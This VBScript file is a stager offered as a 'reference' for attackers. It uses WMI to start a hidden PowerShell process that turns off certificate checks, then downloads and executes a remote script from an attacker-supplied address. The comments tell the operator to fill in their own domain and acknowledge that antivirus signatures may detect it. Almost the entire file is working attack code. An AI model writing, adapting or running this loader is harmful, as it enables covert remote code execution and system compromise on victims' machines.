' Concept, this is not metamorphic and is susceptible to signatures so use this as a reference
' xor-function

' Initialize wmi service, make sure to change the download string domain/ip address
Const HIDDEN_WINDOW = 0
strComputer = "."
strCommand = "powershell -w hidden -c ""&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://your-ip_address-or-domain/b64-tclient')}"""
set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

' Prevent popups
set objStartup = objWMIService.Get("Win32_ProcessStartup")
set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = HIDDEN_WINDOW

' Create Process
set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
objProcess.Create strCommand, Null, objConfig, intProcessID
